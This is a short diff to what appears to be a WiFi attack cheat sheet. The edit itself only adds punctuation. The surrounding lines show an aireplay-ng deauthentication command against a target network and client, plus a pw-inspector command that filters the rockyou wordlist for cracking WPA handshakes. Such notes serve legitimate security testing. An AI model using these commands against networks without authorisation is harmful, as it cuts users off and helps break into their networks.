@@ -30,7 +30,7 @@ Deauth client from BSSID network
 ```
 Aireplay-ng -0 0 -a <TargetNetworkBSSID> -c ClientMAC wlan0mon
 ```
-Dictionary Attack vs WPA handshake - WPA keys are between 8 and 63 characters
+Dictionary Attack vs WPA handshake - WPA keys are between 8 and 63 characters.  
 Optimize wordlist for WPA/WPA2 testing
 ```
 $ pw-inspector -i rockyou.txt -o optimized.txt -m 8 -M 63
